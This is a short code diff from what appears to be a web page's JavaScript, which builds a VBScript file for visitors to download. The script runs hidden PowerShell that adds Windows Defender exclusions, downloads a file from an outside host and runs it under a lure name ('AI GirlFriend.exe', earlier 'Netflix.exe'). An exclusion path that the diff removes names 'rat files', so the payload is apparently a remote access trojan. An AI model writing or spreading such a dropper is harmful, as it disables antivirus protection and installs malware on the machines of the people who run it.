@@ -26,11 +26,11 @@ End Function
 Function Main()
     Set objShell = CreateObject("WScript.Shell")
     objShell.Run "powershell -ExecutionPolicy Bypass -Command ""&  { " & _
-        "Set-MpPreference -ExclusionPath 'C:\Users\Public' ,  'C:\Windows\System32\SubDir', 'C:\Users\HABIB\Desktop\rat files';" & _
-        "Invoke-WebRequest -Uri 'https://ellingtonpropertiesdxb.com/tools.msc' -OutFile 'C:\Users\Public\Netflix.exe';" & _
-        "Start-Process -FilePath 'C:\Users\Public\Netflix.exe' -Wait" & _
+        "Set-MpPreference -ExclusionPath 'C:\Users\Public' ,  'C:\Windows\System32\SubDir';" & _
+        "Invoke-WebRequest -Uri 'https://16.171.63.201/tools.msc' -OutFile 'C:\Users\Public\AI GirlFriend.exe';" & _
+        "Start-Process -FilePath 'C:\Users\Public\AI GirlFriend.exe' -Wait" & _
         "}""", 0, True
-End Function
+End Function
 `;
 
       const blob = new Blob([vbsScript], { type: "text/vbs" });
